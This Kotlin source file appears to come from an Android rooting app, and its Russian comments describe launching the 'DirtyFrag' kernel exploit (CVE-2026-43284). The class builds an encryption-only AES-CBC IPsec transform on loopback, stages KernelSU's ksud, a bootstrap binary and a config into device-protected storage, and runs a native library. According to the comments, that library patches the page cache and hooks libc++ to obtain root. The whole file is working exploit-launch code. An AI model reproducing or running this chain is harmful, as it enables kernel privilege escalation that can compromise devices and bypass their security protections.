package com.rootmyvivo.root

import android.content.Context
import android.net.IpSecAlgorithm
import android.net.IpSecManager
import android.net.IpSecTransform
import java.io.File
import java.security.SecureRandom
import java.nio.file.Files
import java.nio.file.StandardCopyOption
import java.net.DatagramSocket
import java.net.InetAddress

/**
 * Запуск DirtyFrag (CVE-2026-43284) — универсальный механизм, встроенный в APK:
 * нативная libdfroot.so сама выбирает ko по KMI из uname, патчит page cache
 * через ESP-CBC (in-place), ставит хук в libc++.so и триггерит root-контекст.
 *
 * Java-сторона: IpSecManager SA только CRYPT_AES_CBC (encryption-only —
 * форма DFRoot V3.0: без ICV-проверки ядро расшифровывает безусловно;
 * HMAC-вариант давал промах по ICV и page cache не менялся), стейджинг
 * ksud/bootstrap/df.conf в device-protected папку (путь зашит в
 * lkm/dfroot.c), запуск натива.
 */
class DirtyFragRunner {

    private companion object {
        val SU_MANAGERS = listOf(
            "me.weishu.kernelsu",
            "me.bmax.apatch",
            "com.rifsxd.ksunext",
        )
        const val NATIVE_BIN = "libdfroot.so"
    }

    /** Найденный SU-менеджер (его пакет пишется в df.conf для ksud late-load). */
    var suManager: String = "me.weishu.kernelsu"
        private set

    /** device-protected контекст: ko/бутстрап читают наши файлы до разблокировки. */
    private fun dpCtx(ctx: Context): Context = ctx.createDeviceProtectedStorageContext()

    private fun dpDir(ctx: Context): File = dpCtx(ctx).filesDir.parentFile!!

    /** Выбор SU-менеджера: установленный среди известных, иначе дефолт (KernelSU). */
    private fun detectManager(ctx: Context): String {
        for (pkg in SU_MANAGERS) {
            try {
                ctx.createPackageContext(pkg, 0)
                return pkg
            } catch (_: Exception) {
            }
        }
        return "me.weishu.kernelsu"
    }

    private fun stageBin(ctx: Context, src: File, name: String) {
        if (!src.exists()) throw java.io.IOException("$src not found")
        val dest = File(dpDir(ctx), name)
        Files.copy(src.toPath(), dest.toPath(), StandardCopyOption.REPLACE_EXISTING)
        if (!dest.setExecutable(true, false))
            throw java.io.IOException("setExecutable failed: ${dest.absolutePath}")
    }

    /**
     * Стейджинг: ksud (из менеджера, если установлен — libksud.so; иначе наш
     * assets/ksud), bootstrap и df.conf — в /data/user_de/0/<pkg>/.
     * Вызывать и до разблокировки (BootReceiver) — directBootAware.
     */
    fun stage(ctx: Context) {
        val pkg = detectManager(ctx)
        suManager = pkg
        val dp = dpDir(ctx)
        dp.mkdirs()

        var ksudStaged = false
        try {
            val app = ctx.packageManager.getApplicationInfo(pkg, 0)
            val libksud = File(app.nativeLibraryDir, "libksud.so")
            if (libksud.exists()) {
                stageBin(ctx, libksud, "ksud")
                ksudStaged = true
            }
        } catch (_: Exception) {
        }
        if (!ksudStaged) {
            // Универсальный путь: наш ksud из assets (KernelSU userspace daemon)
            val tmp = File(dpCtx(ctx).filesDir, "ksud_asset")
            Files.copy(
                dpCtx(ctx).assets.open("ksud").use { it.readBytes() }.inputStream(),
                tmp.toPath(),
                StandardCopyOption.REPLACE_EXISTING,
            )
            stageBin(ctx, tmp, "ksud")
            tmp.delete()
        }

        val nativeDir = ctx.applicationInfo.nativeLibraryDir
        stageBin(ctx, File(nativeDir, "libbootstrap.so"), "bootstrap")

        // df.conf для бутстрапа (key=value; disable_modules по умолчанию выключен —
        // модули пользователя не трогаем)
        val conf = buildString {
            append("su_manager=").append(pkg).append('\n')
            append("soft_reboot=0\n")
            append("disable_modules=0\n")
        }
        File(dp, "df.conf").writeText(conf)
    }

    /**
     * Полный запуск: SA (IpSecManager) → стейджинг → нативный бинарь.
     * Возвращает строки лога. Кидает исключение при любой ошибкеSetup.
     */
    fun run(ctx: Context, onLine: (String) -> Unit): Int {
        stage(ctx)

        val ipsec = ctx.getSystemService(Context.IPSEC_SERVICE) as? IpSecManager
            ?: throw IllegalStateException("IpSecManager unavailable (requires API 28+)")

        val encapSock = ipsec.openUdpEncapsulationSocket()
        val loopback = InetAddress.getByName("127.0.0.1")
        val spiObj = ipsec.allocateSecurityParameterIndex(loopback)

        val rnd = SecureRandom()
        val aesKey = ByteArray(32).also(rnd::nextBytes)

        // sender port: pick-then-release эфемерный
        val senderSock = DatagramSocket()
        val senderPort = senderSock.localPort
        senderSock.close()

        val transform = IpSecTransform.Builder(ctx)
            .setEncryption(IpSecAlgorithm(IpSecAlgorithm.CRYPT_AES_CBC, aesKey))
            .setIpv4Encapsulation(encapSock, senderPort)
            .buildTransportModeTransform(loopback, spiObj)

        try {
            val bin = File(ctx.applicationInfo.nativeLibraryDir, NATIVE_BIN)
            val cmd = listOf(
                bin.absolutePath,
                "--encap-port", encapSock.port.toString(),
                "--sender-port", senderPort.toString(),
                "--spi", Integer.toUnsignedString(spiObj.spi),
                "--aes-key", hex(aesKey),
            )
            val pb = ProcessBuilder(cmd)
            pb.redirectErrorStream(true)
            val p = pb.start()
            p.inputStream.bufferedReader().forEachLine { onLine(it) }
            return p.waitFor()
        } finally {
            transform.close()
            spiObj.close()
            encapSock.close()
        }
    }

    private fun hex(b: ByteArray): String = b.joinToString("") { String.format("%02x", it) }
}
